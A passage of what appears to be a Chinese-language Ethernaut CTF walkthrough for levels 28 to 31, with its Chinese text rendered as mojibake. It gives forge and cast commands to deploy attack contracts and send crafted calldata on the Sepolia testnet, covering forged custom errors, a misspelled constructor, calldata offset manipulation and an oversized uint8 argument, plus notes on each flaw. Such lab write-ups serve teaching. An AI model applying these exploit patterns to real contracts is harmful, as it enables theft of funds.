# 1. éƒ¨ç½²æ”»å‡»åˆçº¦
forge create src/28-GoodSamaritan/GoodSamaritanAttack.sol:GoodSamaritanAttack \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY \
    --broadcast \
    --constructor-args $GoodSamaritan_ADDRESS
export GoodSamaritan_ADDRESS=0xEfEb3CC9FF84ccf0D376348A216794072d75AB18
Deployed to: 0xfeE3DE6909322e4A0B20E501b9aa4762Eb08F4bf
export ATTACK_ADDRESS=0xfeE3DE6909322e4A0B20E501b9aa4762Eb08F4bf

# 2. æŸ¥çœ‹åˆå§‹ä½™é¢ï¼ˆå¯é€‰ï¼‰
cast call $GoodSamaritan_ADDRESS "coin()(address)" --rpc-url $sepolia_rpc
export COIN_ADDRESS=0x5071E32Bb12387f74909C703B247f07F373A016C
cast call $COIN_ADDRESS "balances(address)(uint256)" $YOUR_ADDRESS --rpc-url $sepolia_rpc
# åº”è¯¥æ˜¯ 0

# 3. æ‰§è¡Œæ”»å‡»
cast send $ATTACK_ADDRESS "attack()" \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY

# 4. éªŒè¯æ”»å‡»æˆåŠŸ
cast call $COIN_ADDRESS "balances(address)(uint256)" $YOUR_ADDRESS --rpc-url $sepolia_rpc
# åº”è¯¥æ˜¾ç¤º 1000000 (10^6)

# æ‰§è¡Œé“¾è·¯
attacker.attack()
  â†’ GoodSamaritan.requestDonation()
    â†’ wallet.donate10(attacker)
      â†’ coin.transfer(attacker, 10)
        â†’ attacker.notify(10)  â† æ”»å‡»è€…æ£€æµ‹åˆ° amount == 10
          â†’ revert NotEnoughBalance()  â† ä¼ªé€ é”™è¯¯ï¼
    â†’ catch NotEnoughBalance()  â† GoodSamaritan è¯¯ä»¥ä¸ºä½™é¢ä¸è¶³
      â†’ wallet.transferRemainder(attacker)
        â†’ coin.transfer(attacker, 1000000)  â† è½¬ç§»å…¨éƒ¨ä½™é¢
          â†’ attacker.notify(1000000)  â† æ­£å¸¸æ¥æ”¶ï¼Œä¸æŠ›é”™
```

### è€ƒå¯Ÿç‚¹
- **è‡ªå®šä¹‰é”™è¯¯ä¼ªé€ **ï¼šä»»ä½•åˆçº¦éƒ½å¯ä»¥æŠ›å‡ºç›¸åŒç­¾åçš„ `NotEnoughBalance()` é”™è¯¯
- **é”™è¯¯å¤„ç†ç¼ºé™·**ï¼šåªæ£€æŸ¥é”™è¯¯ç­¾åï¼Œä¸éªŒè¯é”™è¯¯æ¥æºå’ŒçœŸå®çŠ¶æ€
- **å›è°ƒå‡½æ•°é£é™©**ï¼š`notify()` å›è°ƒç»™æ”»å‡»è€…æ§åˆ¶æ‰§è¡Œæµçš„æœºä¼š
- **ä¸šåŠ¡é€»è¾‘æ¼æ´**ï¼šå°é¢å¤±è´¥ â†’ è½¬ç§»å…¨éƒ¨ä½™é¢çš„è®¾è®¡ä¸åˆç†


# 29-GatekeeperThree
```
# 1. éƒ¨ç½²æ”»å‡»åˆçº¦
export GatekeeperThree_ADDRESS=0xb8c4a855d76719513Ec65558D229c4A8375012Cc
forge create src/29-GatekeeperThree/GatekeeperThreeAttack.sol:GatekeeperThreeAttack \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY \
    --broadcast \
    --constructor-args $GatekeeperThree_ADDRESS
Deployed to: 0x4A846e9a2852DDa7dC78bEC97ff92a9a35e676f1

export ATTACK_ADDRESS=0x4A846e9a2852DDa7dC78bEC97ff92a9a35e676f1

# 2. æ‰§è¡Œæ”»å‡»ï¼ˆéœ€è¦å‘é€ ETHï¼‰
cast send $ATTACK_ADDRESS "attack()" \
    --value 0.002ether \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY

# 3. éªŒè¯æˆåŠŸ
cast call $GatekeeperThree_ADDRESS "entrant()(address)" --rpc-url $sepolia_rpc
# åº”è¯¥è¿”å›ä½ çš„åœ°å€

# æ”»å‡»æµç¨‹
attack()
  â”œâ”€ target.construct0r()           â† Gate 1: æ”»å‡»åˆçº¦æˆä¸º owner
  â”œâ”€ target.createTrick()           â† åˆ›å»º SimpleTrick
  â”œâ”€ target.getAllowance(timestamp) â† Gate 2: è®¾ç½® allowEntrance = true
  â”œâ”€ transfer(0.002 ether)          â† å‘ç›®æ ‡å‘é€ ETH
  â””â”€ target.enter()                 â† Gate 3: send() å¤±è´¥ï¼ˆæ—  receiveï¼‰ï¼Œé€šè¿‡ï¼
       â””â”€ entrant = tx.origin âœ“
```

### è€ƒå¯Ÿç‚¹
- **æ„é€ å‡½æ•°æ‹¼å†™é”™è¯¯**ï¼š`construct0r`ï¼ˆæ•°å­—0ï¼‰ä¸æ˜¯çœŸæ­£çš„ constructorï¼Œä»»ä½•äººå¯è°ƒç”¨
- **tx.origin vs msg.sender**ï¼šé€šè¿‡åˆçº¦è°ƒç”¨ç»•è¿‡ owner æ£€æŸ¥
- **send() å¤±è´¥åˆ©ç”¨**ï¼šæ”»å‡»åˆçº¦ä¸å®ç° receive/fallbackï¼Œæ•…æ„è®© send å¤±è´¥
- **æ—¶é—´æˆ³ä½œä¸ºå¯†ç **ï¼š`block.timestamp` å¯é¢„æµ‹ï¼Œä¸å®‰å…¨

# 30-Switch
```
# 1. éƒ¨ç½²æ”»å‡»åˆçº¦
forge create src/30-Switch/SwitchAttack.sol:SwitchAttack \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY \
    --broadcast

export ATTACK_ADDRESS=0xf0Ebc4e185f70fAdf5aa13392A994EDCe359b869

# 2. æ‰§è¡Œæ”»å‡»
cast send $ATTACK_ADDRESS "attack(address)" $SWITCH_ADDRESS \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY

# 3. éªŒè¯æˆåŠŸ
cast call $SWITCH_ADDRESS "switchOn()(bool)" --rpc-url $sepolia_rpc
# åº”è¯¥è¿”å› true

# Calldata ç»“æ„è§£æ
æ­£å¸¸ calldata:
[0x00-0x04] flipSwitch selector
[0x04-0x24] offset = 0x20
[0x24-0x44] length = 0x04
[0x44-0x48] turnSwitchOff â† ä½ç½® 68

æ”»å‡» calldata:
[0x00-0x04] flipSwitch selector (30c13ade)
[0x04-0x24] offset = 0x60 â† ä¿®æ”¹åç§»é‡ï¼
[0x24-0x44] å¡«å……æ•°æ®
[0x44-0x48] turnSwitchOff (20606e15) â† ä½ç½® 68ï¼Œé€šè¿‡æ£€æŸ¥ âœ“
[0x48-0x60] å¡«å……æ•°æ®
[0x60-0x80] length = 0x04 â† å®é™… _data åœ¨è¿™é‡Œ
[0x80-0x84] turnSwitchOn (76227e12) â† å®é™…æ‰§è¡Œè¿™ä¸ªï¼
```

### è€ƒå¯Ÿç‚¹
- **ABI ç¼–ç æœºåˆ¶**ï¼šåŠ¨æ€ç±»å‹ä½¿ç”¨åç§»é‡æŒ‡é’ˆï¼Œå®é™…æ•°æ®å¯åœ¨ä»»æ„ä½ç½®
- **Calldata æ“çºµ**ï¼šé€šè¿‡ä¿®æ”¹ offsetï¼Œè®©æ£€æŸ¥å’Œæ‰§è¡Œçœ‹åˆ°ä¸åŒçš„æ•°æ®
- **å›ºå®šä½ç½®æ£€æŸ¥ç¼ºé™·**ï¼š`calldatacopy(selector, 68, 4)` å‡è®¾æ•°æ®æ€»åœ¨å›ºå®šä½ç½®
- **ä¿®é¥°ç¬¦ç»•è¿‡**ï¼šåˆ©ç”¨ calldata ç»“æ„ç‰¹æ€§ç»•è¿‡å®‰å…¨æ£€æŸ¥

# 31-HigherOrder
```
# 1. æŸ¥çœ‹åˆå§‹çŠ¶æ€
export HigherOrder_ADDRESS=0x2Aee34a7268Fb1055f4581Bb74AabB1ED9e92814
cast call $HigherOrder_ADDRESS "treasury()(uint256)" --rpc-url $sepolia_rpc
# è¾“å‡º: 0
cast call $HigherOrder_ADDRESS "commander()(address)" --rpc-url $sepolia_rpc
# è¾“å‡º: 0x0000000000000000000000000000000000000000

# 2. è·å–å‡½æ•°é€‰æ‹©å™¨
cast sig "registerTreasury(uint8)"
# è¾“å‡º: 0x211c85ab

# 3. æ„é€ åŸå§‹ calldata ç»•è¿‡ uint8 é™åˆ¶
# calldata = 0x211c85ab (å‡½æ•°é€‰æ‹©å™¨) + 0x0000...0100 (256çš„uint256ç¼–ç )
cast send $HigherOrder_ADDRESS \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY \
    "0x211c85ab0000000000000000000000000000000000000000000000000000000000000100"

# 4. éªŒè¯ treasury å€¼
cast call $HigherOrder_ADDRESS "treasury()(uint256)" --rpc-url $sepolia_rpc
# è¾“å‡º: 256 âœ“

# 5. æˆä¸º commander
cast send $HigherOrder_ADDRESS "claimLeadership()" \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY

# 6. éªŒè¯æˆåŠŸ
cast call $HigherOrder_ADDRESS "commander()(address)" --rpc-url $sepolia_rpc
# è¾“å‡º: ä½ çš„åœ°å€ âœ“

# æ”»å‡»åŸç†
å‡½æ•°ç­¾å: registerTreasury(uint8)  â† ABI æœŸæœ› 1 å­—èŠ‚
å†…éƒ¨å®ç°: sstore(treasury_slot, calldataload(4))  â† è¯»å– 32 å­—èŠ‚ï¼

æ­£å¸¸è°ƒç”¨ registerTreasury(255):
  calldata: 0x211c85ab + 0x00...ff (cast ä¼šæˆªæ–­ä¸º uint8)
  
æ”»å‡»è°ƒç”¨ï¼ˆåŸå§‹ calldataï¼‰:
  calldata: 0x211c85ab + 0x00...0100 (256)
  â”œâ”€ ABI è§£ç å™¨æœŸæœ› uint8ï¼Œä½†æˆ‘ä»¬ç»•è¿‡å®ƒ
  â””â”€ calldataload(4) ç›´æ¥è¯»å–å®Œæ•´ 32 å­—èŠ‚ = 256 âœ“
```

### è€ƒå¯Ÿç‚¹
- **ç±»å‹å®‰å…¨ç»•è¿‡**ï¼šå‡½æ•°ç­¾åå£°æ˜ `uint8`ï¼Œä½† assembly ç›´æ¥è¯»å– 32 å­—èŠ‚
- **ABI ç¼–ç ç†è§£**ï¼šABI ä¼šå°†æ‰€æœ‰åŸºæœ¬ç±»å‹ç¼–ç ä¸º 32 å­—èŠ‚ï¼Œå³ä½¿å£°æ˜ä¸º uint8
- **Calldata ç›´æ¥æ“ä½œ**ï¼šä½¿ç”¨ `calldataload(4)` ç»•è¿‡ Solidity çš„ç±»å‹æ£€æŸ¥
- **åŸå§‹äº¤æ˜“æ„é€ **ï¼šé€šè¿‡ `cast send` å‘é€åŸå§‹ calldata ç»•è¿‡å®¢æˆ·ç«¯éªŒè¯
- **æ•™è®­**ï¼š
  - ä¸è¦æ··ç”¨é«˜çº§ç±»å‹å£°æ˜å’Œä½çº§ assembly è¯»å–
  - Assembly ä¸­åº”è¯¥éªŒè¯å‚æ•°èŒƒå›´
  - æ­£ç¡®åšæ³•ï¼š`let value := and(calldataload(4), 0xff)` æˆªæ–­ä¸º uint8


# 32-Stake

